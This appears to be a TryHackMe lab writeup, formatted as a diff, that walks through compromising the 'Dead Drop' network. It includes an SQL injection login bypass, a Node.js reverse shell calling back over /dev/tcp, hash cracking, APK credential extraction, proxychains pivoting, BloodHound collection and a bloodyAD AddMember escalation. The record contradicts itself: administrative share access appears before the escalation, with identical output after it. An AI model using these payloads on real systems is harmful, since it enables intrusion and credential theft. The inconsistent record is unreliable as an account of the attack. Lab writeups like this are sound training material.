@@ -1,0 +1,412 @@
+TryHackMe Dead Drop - Writeup
+================================
+
+Target information
+------------------
+Target IPs: 192.168.11.100, 192.168.11.51, 192.168.11.200
+VHost: deaddrop.thm
+
+1. Initial port scan and web enumeration
+----------------------------------------
+Only the web server at 192.168.11.200 responded to the initial ping checks.
+
+Command:
+nmap -A 192.168.11.200
+
+Relevant output:
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5
+80/tcp open  http    Node.js Express framework
+|_http-title: Did not follow redirect to /login
+
+I visited:
+http://deaddrop.thm/login
+
+Before attempting to log in, I began enumerating the web application. I entered a single quote (') in the login form and received an error. I then tried the SQL injection payload:
+
+Username: admin' or 1==1-- -
+Password: random value
+
+The login succeeded and I gained access to the dashboard.
+
+The dashboard already contained an uploaded JavaScript file. The application also identified itself as an Express server, suggesting that uploaded JavaScript could be executed server-side.
+
+2. Reverse shell
+----------------
+I created revers.js with the following content:
+
+require('child_process').exec(
+  'bash -c "bash -i >& /dev/tcp/192.168.21.6/4444 0>&1"'
+);
+
+After uploading the file and triggering its execution, I received a reverse shell.
+
+Note: 192.168.21.6 is the callback IP recorded in the payload above.
+
+3. Finding and cracking the svc-drop password hash
+--------------------------------------------------
+Inside the backup folder, I found shadow.bak. It contained:
+
+svc-drop:$6$f1331af25300c7f3$7twueSf8eUyvgYnPWElPYpspGgBuYJ.TMGrPZ2OBC6pGq18ZGkkPke9S0tRlQ3EpiRLWEqhgnqkh2BOHfdCCH0:19700:0:99999:7:::
+
+The $6$ prefix identifies a SHA-512 crypt password hash.
+
+I cracked the hash using Hashcat mode 1800.
+
+Recovered credentials:
+
+Username: svc-drop
+Password: dropsofjupiter
+
+4. SSH access and APK extraction
+--------------------------------
+I logged in over SSH:
+
+ssh svc-drop@192.168.11.200
+
+Inside the backup folder, I found:
+
+deaddrop-mobile.apk
+
+I copied it to my Kali machine:
+
+scp svc-drop@192.168.11.200:~/backup/deaddrop-mobile.apk .
+
+I decompiled the APK:
+
+apktool d deaddrop-mobile.apk -o deaddrop-mobile
+
+The output directory contained:
+
+AndroidManifest.xml
+apktool.yml
+kotlin
+META-INF
+original
+res
+smali
+smali_classes2
+smali_classes3
+unknown
+
+5. Extracting application configuration
+----------------------------------------
+I searched the Android strings file for potentially useful configuration values:
+
+grep -inE 'api|endpoint|url|host|user|pass|token|key|secret|auth|debug|internal' deaddrop-mobile/res/values/strings.xml
+
+Relevant output:
+
+31: <string name="api_endpoint">http://internal.tryhackme.loc/api/v1</string>
+50: <string name="default_password">DropsOfJupiter2026!</string>
+51: <string name="default_username">j.harris</string>
+181: <string name="status_connecting">Connecting to internal API…</string>
+182: <string name="welcome_subtitle">Internal client for DeadDrop Ltd staff</string>
+
+The application revealed:
+
+Username: j.harris
+Password: DropsOfJupiter2026!
+Internal API: http://internal.tryhackme.loc/api/v1
+
+I also searched the decompiled APK for references to the internal API:
+
+grep -RinE 'internal\.tryhackme\.loc|api_endpoint|api/v1' deaddrop-mobile/
+
+Relevant output:
+
+deaddrop-mobile/smali_classes3/com/deaddrop/mobile/MainActivity.smali:
+    const-string v2, "http://internal.tryhackme.loc/api/v1"
+
+deaddrop-mobile/smali_classes3/com/deaddrop/mobile/Config.smali:
+    .field public static final API_ENDPOINT:Ljava/lang/String; = "http://internal.tryhackme.loc/api/v1"
+
+deaddrop-mobile/res/values/strings.xml:
+    <string name="api_endpoint">http://internal.tryhackme.loc/api/v1</string>
+
+This confirmed that the API endpoint was referenced in multiple APK resources.
+
+6. Internal network discovery
+-----------------------------
+On the svc-drop shell, I checked the resolver configuration:
+
+resolvectl status
+
+Relevant output:
+
+Link 2 (ens5)
+    Current Scopes: DNS
+    Current DNS Server: 192.168.11.2
+    DNS Servers: 192.168.11.2
+    DNS Domain: eu-west-1.compute.internal
+
+This identified 192.168.11.2 as the configured DNS server.
+
+I then checked the neighbour table:
+
+ip neigh
+
+Relevant output:
+
+192.168.11.100 dev ens5 lladdr 0a:ff:d0:cc:f3:0d STALE
+192.168.11.250 dev ens5 lladdr 0a:ff:e9:17:47:d9 STALE
+192.168.11.51 dev ens5 FAILED
+192.168.11.2 dev ens5 lladdr 0a:ff:cf:9e:c6:69 STALE
+192.168.11.1 dev ens5 lladdr 0a:ff:cf:9e:c6:69 REACHABLE
+
+Initial observations:
+- 192.168.11.100: later identified as the Domain Controller.
+- 192.168.11.250: internal Linux server; later identified as running Squid.
+- 192.168.11.51: neighbour resolution failed; its role remains unknown.
+- 192.168.11.2: configured DNS server.
+- 192.168.11.1: network gateway.
+
+A STALE neighbour entry does not mean that a host is offline; it means the entry has not recently been confirmed.
+
+7. Enumerating 192.168.11.250
+------------------------------
+I scanned the internal host:
+
+nmap -sV 192.168.11.250
+
+Output:
+
+PORT     STATE SERVICE      VERSION
+22/tcp   open  ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
+139/tcp  open  netbios-ssn?
+443/tcp  open  https?
+445/tcp  open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+8080/tcp open  http-proxy   Squid http proxy 3.5.27
+
+This host exposed SSH, SMB/Samba, HTTPS and Squid proxy services.
+
+8. Creating a SOCKS tunnel through the compromised web server
+-------------------------------------------------------------
+I used the SSH access to svc-drop as a pivot into the internal network.
+
+On my local Kali machine, I started a dynamic SOCKS5 tunnel:
+
+ssh -N -D 1080 svc-drop@192.168.11.200
+
+I kept this SSH process running in its own terminal.
+
+I created a separate Proxychains configuration so the system-wide configuration remained unchanged:
+
+cp /etc/proxychains4.conf ~/deaddrop-proxychains.conf
+
+I configured the local copy:
+
+sed -i \
+-e 's/^#dynamic_chain/dynamic_chain/' \
+-e 's/^strict_chain/#strict_chain/' \
+-e 's/^socks4[[:space:]]*127\.0\.0\.1[[:space:]]*9050/socks5 127.0.0.1 1080/' \
+~/deaddrop-proxychains.conf
+
+I verified the settings:
+
+grep -nE 'dynamic_chain|strict_chain|proxy_dns|socks4|socks5' ~/deaddrop-proxychains.conf
+
+Relevant output:
+
+10:dynamic_chain
+18:#strict_chain
+60:proxy_dns
+161:socks5 127.0.0.1 1080
+
+From this point, I ran internal network tools through:
+
+proxychains4 -f ~/deaddrop-proxychains.conf
+
+If the SSH tunnel stops, the local SOCKS listener on 127.0.0.1:1080 disappears and the tunnel must be restarted.
+
+9. Identifying and authenticating to the Domain Controller
+----------------------------------------------------------
+I tested the credentials recovered from the Android application against 192.168.11.100:
+
+proxychains4 -f ~/deaddrop-proxychains.conf nxc smb 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!' -d deaddrop.loc
+
+Relevant output:
+
+SMB 192.168.11.100 445 DEADDROP-DC
+[*] Windows 10 / Server 2019 Build 17763
+(name:DEADDROP-DC) (domain:deaddrop.loc)
+
+[+] deaddrop.loc\j.harris:DropsOfJupiter2026! (Pwn3d!)
+
+This identified 192.168.11.100 as DEADDROP-DC in the deaddrop.loc domain and confirmed that the credentials were valid.
+
+I enumerated its SMB shares:
+
+proxychains4 -f ~/deaddrop-proxychains.conf nxc smb 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!' -d deaddrop.loc --shares
+
+Output:
+
+Share       Permissions
+-----       -----------
+ADMIN$      READ,WRITE
+C$          READ,WRITE
+IPC$        READ
+NETLOGON    READ,WRITE
+SYSVOL      READ,WRITE
+
+10. Active Directory collection with BloodHound
+------------------------------------------------
+I collected Active Directory information:
+
+proxychains4 -f ~/deaddrop-proxychains.conf bloodhound-python \
+-u j.harris \
+-p 'DropsOfJupiter2026!' \
+-d deaddrop.loc \
+-ns 192.168.11.100 \
+-dc DEADDROP-DC.deaddrop.loc \
+-c All \
+--zip \
+--dns-tcp
+
+Relevant output:
+
+Found AD domain: deaddrop.loc
+Found 2 computers
+Found 8 users
+Found 55 groups
+Found 2 gpos
+Found 9 ous
+Found 22 containers
+Done in 01M 18S
+Compressing output into 20261117182539_bloodhound.zip
+
+I opened BloodHound and imported:
+
+20261117182539_bloodhound.zip
+
+The import completed successfully.
+
+11. Discovering the AddMember permission
+----------------------------------------
+In BloodHound, I examined the j.harris account and the ITSupport-Admins group.
+
+The group description stated:
+
+IT Support administrators (delegated DA-equivalent rights)
+
+The relevant permission identified in the graph was:
+
+AddMember
+
+This permission allowed j.harris to add itself to the ITSupport-Admins group.
+
+The target group for the escalation was:
+
+ITSupport-Admins
+
+12. Exploiting AddMember with BloodyAD
+--------------------------------------
+I checked whether BloodyAD was installed:
+
+which bloodyAD
+
+Output:
+
+/home/bhairav/.local/bin/bloodyAD
+
+I then added j.harris to ITSupport-Admins through the SOCKS tunnel:
+
+proxychains4 -f ~/deaddrop-proxychains.conf bloodyAD \
+--host 192.168.11.100 \
+-d deaddrop.loc \
+-u j.harris \
+-p 'DropsOfJupiter2026!' \
+add groupMember ITSupport-Admins j.harris
+
+Output:
+
+[+] j.harris added to ITSupport-Admins
+
+The group membership change succeeded.
+
+13. Testing access to the Domain Controller
+-------------------------------------------
+I tested SMB authentication again:
+
+proxychains4 -f ~/deaddrop-proxychains.conf nxc smb 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!' -d deaddrop.loc
+
+Relevant output:
+
+[+] deaddrop.loc\j.harris:DropsOfJupiter2026! (Pwn3d!)
+
+I enumerated the shares again:
+
+proxychains4 -f ~/deaddrop-proxychains.conf nxc smb 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!' -d deaddrop.loc --shares
+
+Output:
+
+Share       Permissions
+-----       -----------
+ADMIN$      READ,WRITE
+C$          READ,WRITE
+IPC$        READ
+NETLOGON    READ,WRITE
+SYSVOL      READ,WRITE
+
+The account had READ,WRITE access to the administrative shares, including C$.
+
+14. Locating the Domain Controller flag
+---------------------------------------
+I connected to the C$ share and listed the Administrator desktop:
+
+proxychains4 -f ~/deaddrop-proxychains.conf smbclient //192.168.11.100/C$ \
+-U 'deaddrop.loc/j.harris%DropsOfJupiter2026!' \
+-c 'cd Users/Administrator/Desktop; ls'
+
+Output:
+
+desktop.ini
+EC2 Feedback.website
+EC2 Microsoft Windows Guide.website
+flag.txt
+
+The Domain Controller flag was located at:
+
+C:\Users\Administrator\Desktop\flag.txt
+
+The flag file was found, but its contents had not yet been retrieved at the time this writeup was assembled.
+
+To retrieve it:
+
+proxychains4 -f ~/deaddrop-proxychains.conf smbclient //192.168.11.100/C$ \
+-U 'deaddrop.loc/j.harris%DropsOfJupiter2026!' \
+-c 'cd Users/Administrator/Desktop; get flag.txt'
+
+Then read the downloaded file locally:
+
+cat flag.txt
+
+15. Summary of important findings
+---------------------------------
+Web server:          192.168.11.200
+Domain Controller:   192.168.11.100
+Other discovered IP: 192.168.11.250
+Unidentified host:   192.168.11.51
+DNS server:          192.168.11.2
+Gateway:             192.168.11.1
+VHost:               deaddrop.thm
+AD domain:           deaddrop.loc
+DC hostname:         DEADDROP-DC
+Internal API:        http://internal.tryhackme.loc/api/v1
+
+Credentials:
+svc-drop : dropsofjupiter
+j.harris : DropsOfJupiter2026!
+
+Privilege escalation:
+Permission: AddMember
+Target group: ITSupport-Admins
+Tool: BloodyAD
+
+Flag location:
+C:\Users\Administrator\Desktop\flag.txt
+
+Unresolved item:
+192.168.11.51 was not identified during the work recorded here.
+
+End of writeup
+===============
